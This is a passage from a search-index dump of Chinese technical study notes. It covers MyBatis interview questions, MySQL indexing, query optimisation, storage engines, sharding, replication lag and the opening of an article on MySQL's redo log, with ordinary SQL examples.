条记录的去重复功能，\u0026lt;id\u0026gt;可以有多个，代表了联合主键的语意。\n同样主对象的关联对象，也是根据这个原理去重复的，尽管一般情况下，只有主对象会有重复记录，关联对象一般不会重复。\n举例：下面 join 查询出来 6 条记录，一、二列是 Teacher 对象列，第三列为 Student 对象列，MyBatis 去重复处理后，结果为 1 个老师 6 个学生，而不是 6 个老师 6 个学生。\n   t_id t_name s_id     1 teacher 38   1 teacher 39   1 teacher 40   1 teacher 41   1 teacher 42   1 teacher 43    10、MyBatis 是否支持延迟加载？如果支持，它的实现原理是什么？    注：我出的。\n答：MyBatis 仅支持 association 关联对象和 collection 关联集合对象的延迟加载，association 指的就是一对一，collection 指的就是一对多查询。在 MyBatis 配置文件中，可以配置是否启用延迟加载 lazyLoadingEnabled=true|false。\n它的原理是，使用 CGLIB 创建目标对象的代理对象，当调用目标方法时，进入拦截器方法，比如调用 a.getB().getName()，拦截器 invoke()方法发现 a.getB()是 null 值，那么就会单独发送事先保存好的查询关联 B 对象的 sql，把 B 查询上来，然后调用 a.setB(b)，于是 a 的对象 b 属性就有值了，接着完成 a.getB().getName()方法的调用。这就是延迟加载的基本原理。\n当然了，不光是 MyBatis，几乎所有的包括 Hibernate，支持延迟加载的原理都是一样的。\n11、MyBatis 的 Xml 映射文件中，不同的 Xml 映射文件，id 是否可以重复？    注：我出的。\n答：不同的 Xml 映射文件，如果配置了 namespace，那么 id 可以重复；如果没有配置 namespace，那么 id 不能重复；毕竟 namespace 不是必须的，只是最佳实践而已。\n原因就是 namespace+id 是作为 Map\u0026lt;String, MappedStatement\u0026gt;的 key 使用的，如果没有 namespace，就剩下 id，那么，id 重复会导致数据互相覆盖。有了 namespace，自然 id 就可以重复，namespace 不同，namespace+id 自然也就不同。\n12、MyBatis 中如何执行批处理？    注：我出的。\n答：使用 BatchExecutor 完成批处理。\n13、MyBatis 都有哪些 Executor 执行器？它们之间的区别是什么？    注：我出的\n答：MyBatis 有三种基本的 Executor 执行器，SimpleExecutor、ReuseExecutor、BatchExecutor。\n**SimpleExecutor：**每执行一次 update 或 select，就开启一个 Statement 对象，用完立刻关闭 Statement 对象。\n**ReuseExecutor：**执行 update 或 select，以 sql 作为 key 查找 Statement 对象，存在就使用，不存在就创建，用完后，不关闭 Statement 对象，而是放置于 Map\u0026lt;String, Statement\u0026gt;内，供下一次使用。简言之，就是重复使用 Statement 对象。\n**BatchExecutor：**执行 update（没有 select，JDBC 批处理不支持 select），将所有 sql 都添加到批处理中（addBatch()），等待统一执行（executeBatch()），它缓存了多个 Statement 对象，每个 Statement 对象都是 addBatch()完毕后，等待逐一执行 executeBatch()批处理。与 JDBC 批处理相同。\n作用范围：Executor 的这些特点，都严格限制在 SqlSession 生命周期范围内。\n14、MyBatis 中如何指定使用哪一种 Executor 执行器？    注：我出的\n答：在 MyBatis 配置文件中，可以指定默认的 ExecutorType 执行器类型，也可以手动给 DefaultSqlSessionFactory 的创建 SqlSession 的方法传递 ExecutorType 类型参数。\n15、MyBatis 是否可以映射 Enum 枚举类？    注：我出的\n答：MyBatis 可以映射枚举类，不单可以映射枚举类，MyBatis 可以映射任何对象到表的一列上。映射方式为自定义一个 TypeHandler，实现 TypeHandler 的 setParameter()和 getResult()接口方法。TypeHandler 有两个作用，一是完成从 javaType 至 jdbcType 的转换，二是完成 jdbcType 至 javaType 的转换，体现为 setParameter()和 getResult()两个方法，分别代表设置 sql 问号占位符参数和获取列查询结果。\n16、MyBatis 映射文件中，如果 A 标签通过 include 引用了 B 标签的内容，请问，B 标签能否定义在 A 标签的后面，还是说必须定义在 A 标签的前面？    注：我出的\n答：虽然 MyBatis 解析 Xml 映射文件是按照顺序解析的，但是，被引用的 B 标签依然可以定义在任何地方，MyBatis 都可以正确识别。\n原理是，MyBatis 解析 A 标签，发现 A 标签引用了 B 标签，但是 B 标签尚未解析到，尚不存在，此时，MyBatis 会将 A 标签标记为未解析状态，然后继续解析余下的标签，包含 B 标签，待所有标签解析完毕，MyBatis 会重新解析那些被标记为未解析的标签，此时再解析 A 标签时，B 标签已经存在，A 标签也就可以正常解析完成了。\n17、简述 MyBatis 的 Xml 映射文件和 MyBatis 内部数据结构之间的映射关系？    注：我出的\n答：MyBatis 将所有 Xml 配置信息都封装到 All-In-One 重量级对象 Configuration 内部。在 Xml 映射文件中，\u0026lt;parameterMap\u0026gt;标签会被解析为 ParameterMap 对象，其每个子元素会被解析为 ParameterMapping 对象。\u0026lt;resultMap\u0026gt;标签会被解析为 ResultMap 对象，其每个子元素会被解析为 ResultMapping 对象。每一个\u0026lt;select\u0026gt;、\u0026lt;insert\u0026gt;、\u0026lt;update\u0026gt;、\u0026lt;delete\u0026gt;标签均会被解析为 MappedStatement 对象，标签内的 sql 会被解析为 BoundSql 对象。\n18、为什么说 MyBatis 是半自动 ORM 映射工具？它与全自动的区别在哪里？    注：我出的\n答：Hibernate 属于全自动 ORM 映射工具，使用 Hibernate 查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。而 MyBatis 在查询关联对象或关联集合对象时，需要手动编写 sql 来完成，所以，称之为半自动 ORM 映射工具。\n面试题看似都很简单，但是想要能正确回答上来，必定是研究过源码且深入的人，而不是仅会使用的人或者用的很熟的人，以上所有面试题及其答案所涉及的内容，在我的 MyBatis 系列博客中都有详细讲解和原理分析。\n"},{"id":268,"href":"/%E7%AC%94%E8%AE%B0/MySQL/","title":"MySQL","parent":"笔记","content":"MySQL     MySQL  一、索引  B+ Tree 原理 MySQL 索引 索引优化 索引的优点 索引的使用条件   二、查询性能优化  使用 Explain 进行分析 优化数据访问 重构查询方式   三、存储引擎  InnoDB MyISAM 比较   四、数据类型  整型 浮点数 字符串 时间和日期   五、切分  水平切分 垂直切分 Sharding 策略 Sharding 存在的问题   六、复制  主从复制 读写分离   参考资料    一、索引    B+ Tree 原理    1. 数据结构    B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。\nB+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。\n在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。\n\n2. 操作    进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。\n插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。\n3. 与红黑树的比较    红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。\n（一）B+ 树有更低的树高\n平衡树的树高 O(h)=O(logdN)，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。\n（二）磁盘访问原理\n操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。\n如果数据不在同一个磁盘块上，那么通常需要移动制动手臂进行寻道，而制动手臂因为其物理结构导致了移动效率低下，从而增加磁盘数据读取时间。B+ 树相对于红黑树有更低的树高，进行寻道的次数与树高成正比，在同一个磁盘块上进行访问只需要很短的磁盘旋转时间，所以 B+ 树更适合磁盘数据的读取。\n（三）磁盘预读特性\n为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。并且可以利用预读特性，相邻的节点也能够被预先载入。\nMySQL 索引    索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。\n1. B+Tree 索引    是大多数 MySQL 存储引擎的默认索引类型。\n因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。\n因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。\n可以指定多个列作为索引列，多个索引列共同组成键。\n适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。\nInnoDB 的 B+Tree 索引分为主索引和辅助索引。主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。\n\n辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。\n\n2. 哈希索引    哈希索引能以 O(1) 时间进行查找，但是失去了有序性：\n 无法用于排序与分组； 只支持精确查找，无法用于部分查找和范围查找。  InnoDB 存储引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。\n3. 全文索引    MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。\n查找条件使用 MATCH AGAINST，而不是普通的 WHERE。\n全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。\nInnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。\n4. 空间数据索引    MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。\n必须使用 GIS 相关的函数来维护数据。\n索引优化    1. 独立的列    在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。\n例如下面的查询不能使用 actor_id 列的索引：\nSELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5; 2. 多列索引    在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。\nSELECT film_id, actor_ id FROM sakila.film_actor WHERE actor_id = 1 AND film_id = 1; 3. 索引列的顺序    让选择性最强的索引列放在前面。\n索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。\n例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。\nSELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity, COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity, COUNT(*) FROM payment; staff_id_selectivity: 0.0001 customer_id_selectivity: 0.0373 COUNT(*): 16049 4. 前缀索引    对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。\n前缀长度的选取需要根据索引选择性来确定。\n5. 覆盖索引    索引包含所有需要查询的字段的值。\n具有以下优点：\n 索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。  索引的优点      大大减少了服务器需要扫描的数据行数。\n  帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，不需要排序和分组，也就不需要创建临时表）。\n  将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，会将相邻的数据都存储在一起）。\n  索引的使用条件      对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效；\n  对于中到大型的表，索引就非常有效；\n  但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。\n  二、查询性能优化    使用 Explain 进行分析    Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。\n比较重要的字段有：\n select_type : 查询类型，有简单查询、联合查询、子查询等 key : 使用的索引 rows : 扫描的行数  优化数据访问    1. 减少请求的数据量     只返回必要的列：最好不要使用 SELECT * 语句。 只返回必要的行：使用 LIMIT 语句来限制返回的数据。 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。  2. 减少服务器端扫描的行数    最有效的方式是使用索引来覆盖查询。\n重构查询方式    1. 切分大查询    一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。\nDELETE FROM messages WHERE create \u0026lt; DATE_SUB(NOW(), INTERVAL 3 MONTH); rows_affected = 0 do { rows_affected = do_query( \u0026#34;DELETE FROM messages WHERE create \u0026lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000\u0026#34;) } while rows_affected \u0026gt; 0 2. 分解大连接查询    将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：\n 让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。 分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。 减少锁竞争； 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。  SELECT * FROM tag JOIN tag_post ON tag_post.tag_id=tag.id JOIN post ON tag_post.post_id=post.id WHERE tag.tag=\u0026#39;mysql\u0026#39;; SELECT * FROM tag WHERE tag=\u0026#39;mysql\u0026#39;; SELECT * FROM tag_post WHERE tag_id=1234; SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904); 三、存储引擎    InnoDB    是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。\n实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ Next-Key Locking 防止幻影读。\n主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。\n内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。\n支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。\nMyISAM    设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。\n提供了大量的特性，包括压缩表、空间数据索引等。\n不支持事务。\n不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。\n可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。\n如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。\n比较      事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。\n  并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。\n  外键：InnoDB 支持外键。\n  备份：InnoDB 支持在线热备份。\n  崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。\n  其它特性：MyISAM 支持压缩表和空间数据索引。\n  四、数据类型    整型    TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。\nINT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。\n浮点数    FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。\nFLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。\n字符串    主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。\nVARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。\n在进行存储和检索时，会保留 VARCHAR 末尾的空格，而会删除 CHAR 末尾的空格。\n时间和日期    MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。\n1. DATETIME    能够保存从 1000 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。\n它与时区无关。\n默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATETIME 值，例如“2008-01-16 22:37:08”，这是 ANSI 标准定义的日期和时间表示方法。\n2. TIMESTAMP    和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。\n它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。\nMySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。\n默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。\n应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。\n五、切分    水平切分    水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。\n当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。\n\n垂直切分    垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。\n在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库、用户数据库等。\n\nSharding 策略     哈希取模：hash(key) % N； 范围：可以是 ID 范围也可以是时间范围； 映射表：使用单独的一个数据库来存储映射关系。  Sharding 存在的问题    1. 事务问题    使用分布式事务来解决，比如 XA 接口。\n2. 连接    可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。\n3. ID 唯一性     使用全局唯一 ID（GUID） 为每个分片指定一个 ID 范围 分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)  六、复制    主从复制    主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。\n binlog 线程 ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。 I/O 线程 ：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。 SQL 线程 ：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中重放（Replay）。  \n读写分离    主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。\n读写分离能提高性能的原因在于：\n 主从服务器负责各自的读和写，极大程度缓解了锁的争用； 从服务器可以使用 MyISAM，提升查询性能以及节约系统开销； 增加冗余，提高可用性。  读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。\n\n参考资料     BaronScbwartz, PeterZaitsev, VadimTkacbenko, 等. 高性能 MySQL[M]. 电子工业出版社, 2013. 姜承尧. MySQL 技术内幕: InnoDB 存储引擎 [M]. 机械工业出版社, 2011. 20+ 条 MySQL 性能优化的最佳经验 服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策 How to create unique row ID in sharded databases? SQL Azure Federation – Introduction MySQL 索引背后的数据结构及算法原理 MySQL 性能优化神器 Explain 使用分析 How Sharding Works 大众点评订单系统分库分表实践 B + 树  "},{"id":269,"href":"/database/MySQLMySQL-Index/","title":"MySQL Index","parent":"database","content":"Mysql索引主要使用的两种数据结构    哈希索引    对于哈希索引来说，底层的数据结构就是哈希表，因此在绝大多数需求为单条记录查询的时候，可以选择哈希索引，查询性能最快；其余大部分场景，建议选择BTree索引。\nBTree索引    覆盖索引介绍    什么是覆盖索引    如果一个索引包含（或者说覆盖）所有需要查询的字段的值，我们就称之为“覆盖索引”。我们知道InnoDB存储引擎中，如果不是主键索引，叶子节点存储的是主键+列值。最终还是要“回表”，也就是要通过主键再查找一次。这样就会比较慢覆盖索引就是把要查询出的列和索引是对应的，不做回表操作！\n覆盖索引使用实例    现在我创建了索引(username,age)，我们执行下面的 sql 语句\nselect username , age from user where username = \u0026#39;Java\u0026#39; and age = 22 在查询数据的时候：要查询出的列在叶子节点都存在！所以，就不用回表。\n选择索引和编写利用这些索引的查询的3个原则     单行访问是很慢的。特别是在机械硬盘存储中（SSD的随机I/O要快很多，不过这一点仍然成立）。如果服务器从存储中读取一个数据块只是为了获取其中一行，那么就浪费了很多工作。最好读取的块中能包含尽可能多所需要的行。使用索引可以创建位置引，用以提升效率。 按顺序访问范围数据是很快的，这有两个原因。第一，顺序 I/O 不需要多次磁盘寻道，所以比随机I/O要快很多（特别是对机械硬盘）。第二，如果服务器能够按需要顺序读取数据，那么就不再需要额外的排序操作，并且GROUPBY查询也无须再做排序和将行按组进行聚合计算了。 索引覆盖查询是很快的。如果一个索引包含了查询需要的所有列，那么存储引擎就不需要再回表查找行。这避免了大量的单行访问，而上面的第1点已经写明单行访问是很慢的。  为什么索引能提高查询速度     以下内容整理自： 地址： https://juejin.im/post/5b55b842f265da0f9e589e79 作者 ：Java3y\n 先从 MySQL 的基本存储结构说起    MySQL的基本存储结构是页(记录都存在页里边)：\n 各个数据页可以组成一个双向链表 每个数据页中的记录又可以组成一个单向链表  每个数据页都会为存储在它里边儿的记录生成一个页目录，在通过主键查找某条记录的时候可以在页目录中使用二分法快速定位到对应的槽，然后再遍历该槽对应分组中的记录即可快速找到指定的记录 以其他列(非主键)作为搜索条件：只能从最小记录开始依次遍历单链表中的每条记录。    所以说，如果我们写select * from user where indexname = \u0026lsquo;xxx\u0026rsquo;这样没有进行任何优化的sql语句，默认会这样做：\n 定位到记录所在的页：需要遍历双向链表，找到所在的页 从所在的页内中查找相应的记录：由于不是根据主键查询，只能遍历所在页的单链表了  很明显，在数据量很大的情况下这样查找会很慢！这样的时间复杂度为O(n)。\n使用索引之后    索引做了些什么可以让我们查询加快速度呢？其实就是将无序的数据变成有序(相对)：\n要找到id为8的记录简要步骤：\n很明显的是：没有用索引我们是需要遍历双向链表来定位对应的页，现在通过 “目录” 就可以很快地定位到对应的页上了！（二分查找，时间复杂度近似为O(logn)）\n其实底层结构就是B+树，B+树作为树的一种实现，能够让我们很快地查找出对应的记录。\n关于索引其他重要的内容补充     以下内容整理自：《Java工程师修炼之道》\n 最左前缀原则    MySQL中的索引可以以一定顺序引用多列，这种索引叫作联合索引。如User表的name和city加联合索引就是(name,city)，而最左前缀原则指的是，如果查询的时候查询条件精确匹配索引的左边连续一列或几列，则此列就可以被用到。如下：\nselect * from user where name=xx and city=xx ; ／／可以命中索引 select * from user where name=xx ; // 可以命中索引 select * from user where city=xx ; // 无法命中索引 这里需要注意的是，查询的时候如果两个条件都用上了，但是顺序不同，如 city= xx and name ＝xx，那么现在的查询引擎会自动优化为匹配联合索引的顺序，这样是能够命中索引的。\n由于最左前缀原则，在创建联合索引时，索引字段的顺序需要考虑字段值去重之后的个数，较多的放前面。ORDER BY子句也遵循此规则。\n注意避免冗余索引    冗余索引指的是索引的功能相同，能够命中索引(a, b)就肯定能命中索引(a) ，那么索引(a)就是冗余索引。如（name,city）和（name）这两个索引就是冗余索引，能够命中前者的查询肯定是能够命中后者。在大多数情况下，都应该尽量扩展已有的索引而不是创建新索引。\nMySQL 5.7 版本后，可以通过查询 sys 库的 schema_redundant_indexes 表来查看冗余索引。\n"},{"id":270,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/mysql-read-write-separation/","title":"mysql-read-write-separation","parent":"高并发","content":"面试题    你们有没有做 MySQL 读写分离？如何实现 MySQL 的读写分离？MySQL 主从复制原理的是啥？如何解决 MySQL 主从同步的延时问题？\n面试官心理分析    高并发这个阶段，肯定是需要做读写分离的，啥意思？因为实际上大部分的互联网公司，一些网站，或者是 app，其实都是读多写少。所以针对这个情况，就是写一个主库，但是主库挂多个从库，然后从多个从库来读，那不就可以支撑更高的读并发压力了吗？\n面试题剖析    如何实现 MySQL 的读写分离？    其实很简单，就是基于主从复制架构，简单来说，就搞一个主库，挂多个从库，然后我们就单单只是写主库，然后主库会自动把数据给同步到从库上去。\nMySQL 主从复制原理的是啥？    主库将变更写入 binlog 日志，然后从库连接到主库之后，从库有一个 IO 线程，将主库的 binlog 日志拷贝到自己本地，写入一个 relay 中继日志中。接着从库中有一个 SQL 线程会从中继日志读取 binlog，然后执行 binlog 日志中的内容，也就是在自己本地再次执行一遍 SQL，这样就可以保证自己跟主库的数据是一样的。\n这里有一个非常重要的一点，就是从库同步主库数据的过程是串行化的，也就是说主库上并行的操作，在从库上会串行执行。所以这就是一个非常重要的点了，由于从库从主库拷贝日志以及串行执行 SQL 的特点，在高并发场景下，从库的数据一定会比主库慢一些，是有延时的。所以经常出现，刚写入主库的数据可能是读不到的，要过几十毫秒，甚至几百毫秒才能读取到。\n而且这里还有另外一个问题，就是如果主库突然宕机，然后恰好数据还没同步到从库，那么有些数据可能在从库上是没有的，有些数据可能就丢失了。\n所以 MySQL 实际上在这一块有两个机制，一个是半同步复制，用来解决主库数据丢失问题；一个是并行复制，用来解决主从同步延时问题。\n这个所谓半同步复制，也叫 semi-sync 复制，指的就是主库写入 binlog 日志之后，就会将强制此时立即将数据同步到从库，从库将日志写入自己本地的 relay log 之后，接着会返回一个 ack 给主库，主库接收到至少一个从库的 ack 之后才会认为写操作完成了。\n所谓并行复制，指的是从库开启多个线程，并行读取 relay log 中不同库的日志，然后并行重放不同库的日志，这是库级别的并行。\nMySQL 主从同步延时问题（精华）    以前线上确实处理过因为主从同步延时问题而导致的线上的 bug，属于小型的生产事故。\n是这个么场景。有个同学是这样写代码逻辑的。先插入一条数据，再把它查出来，然后更新这条数据。在生产环境高峰期，写并发达到了 2000/s，这个时候，主从复制延时大概是在小几十毫秒。线上会发现，每天总有那么一些数据，我们期望更新一些重要的数据状态，但在高峰期时候却没更新。用户跟客服反馈，而客服就会反馈给我们。\n我们通过 MySQL 命令：\nshow slave status 查看 Seconds_Behind_Master ，可以看到从库复制主库的数据落后了几 ms。\n一般来说，如果主从延迟较为严重，有以下解决方案：\n 分库，将一个主库拆分为多个主库，每个主库的写并发就减少了几倍，此时主从延迟可以忽略不计。 打开 MySQL 支持的并行复制，多个库并行复制。如果说某个库的写入并发就是特别高，单库写并发达到了 2000/s，并行复制还是没意义。 重写代码，写代码的同学，要慎重，插入数据时立马查询可能查不到。 如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询设置直连主库。不推荐这种方法，你要是这么搞，读写分离的意义就丧失了。  "},{"id":271,"href":"/database/mysql/MySQL%E4%B8%89%E5%A4%A7%E6%97%A5%E5%BF%97/","title":"MySQL三大日志","parent":"mysql","content":" 本文来自公号程序猿阿星投稿，JavaGuide 对其做了补充完善。\n 前言    MySQL 日志 主要包括错误日志、查询日志、慢查询日志、事务日志、二进制日志几大类。其中，比较重要的还要属二进制日志 binlog（归档日志）和事务日志 redo log（重做日志）和 undo log（回滚日志）。\n今天就来聊聊 redo log（重做日志）、binlog（归档日志）、两阶段提交、undo log （回滚日志）。\nredo log    redo log（重做日志）是InnoDB存储引擎独有的，它让MySQL拥有了崩溃恢复能力。\n比如 MySQL 实例挂了或宕机了，重启时，InnoDB存储引擎会使用redo log恢复数据，保证数据的持久性与完整性。\nMySQL 中数据是以页为单位，你查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 Buffer Pool 中。\n后续的查询都是先从 Buffer Pool 中找，没有命中再去硬盘加载，减少硬盘 IO 开销，提升性能。\n更新表数据的时候，也是如此，发现 Buffer Pool 里存在要更新的数据，就直接在 Buffer Pool 里更新。\n然后会把“在某个数据页上做了什么修改”记录到重做日志缓存（redo log buffer）里，接着刷盘到 redo log 文件里。\n理想情况，事务一提交就会进行刷盘操作，但实际上，刷盘的时机是根据策略来进行的。\n 小贴士：每条 redo 记录由“表空间号+数据页号+偏移量+修改数据长度+具体修改的数据”组成\n 刷盘时机    InnoDB 存储引擎为 redo log 的刷盘策略提供了 innodb_flush_log_at_trx_commit 参数，它支持三种策略：\n 0 ：设置为 0 的时候，表示每次事务提交时不进行刷盘操作 1 ：设置为 1 的时候，表示每次事务提交时都将进行刷盘操作（默认值） 2 ：设置为 2 的时候，表示每次事务提交时都只把 redo log buffer 内容写入 page cache  innodb_flush_log_at_trx_commit 参数默认为 1 ，也就是说当事务提交时会调用 fsync 对 redo log 进行刷盘\n另外，InnoDB 存储引擎有一个后台线程，每隔1 秒，就会把 redo log buffer 中的内容写到文件系统缓存（page cache），然后调用 fsync 刷盘。\n也就是说，一个没有提交事务的 redo log 记录，也可能会刷盘。\n为什么呢？\n因为在事务执行过程 redo log 记录是会写入redo log buffer 中，这些 redo log 记录会被后台线程刷盘。\n除了后台线程每秒1次的轮询操作，还有一种情况，当 redo log buffer 占用的空间即将达到 innodb_log_buffer_size 一半的时候，后台线程会主动刷盘。\n下面是不同刷盘策略的流程图。\ninnodb_flush_log_at_trx_commit=0    为0时，如果MySQL挂了或宕机可能会有1秒数据的丢失。\ninnodb_flush_log_at_trx_commit=1    为1时， 只要事务提交成功，redo 